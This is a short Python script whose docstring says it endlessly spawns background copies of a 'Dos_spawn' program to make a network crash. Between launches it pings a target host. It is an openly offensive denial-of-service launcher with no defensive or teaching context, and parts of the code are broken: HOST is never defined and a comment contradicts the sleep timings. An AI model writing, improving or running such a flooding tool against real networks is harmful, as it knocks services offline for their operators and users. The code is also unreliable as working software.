import os
import time
import random
import Dos_spawn

"""Infinitly spawns new versions of Dos_spawn, this
causes the network to crash."""

counter = 0

def main():
	count = 0
	while True:
		# waits between 10 and 60 seconds to spawn a new one
		for x in range(1, 6):
			spawn_dos()
			time.sleep(10)
			check()
			if counter > 25:
				time.sleep(400)


def check():
	global counter

	while True:
		response = os.system("ping -c 1 " + HOST)
		print(response)
		if response == 0:
			counter += 1
		else:
			return None


def spawn_dos():
	# does a system call to spawn new ones in background
	os.system("python Dos_spawn.py &")

if __name__ == "__main__":
	main()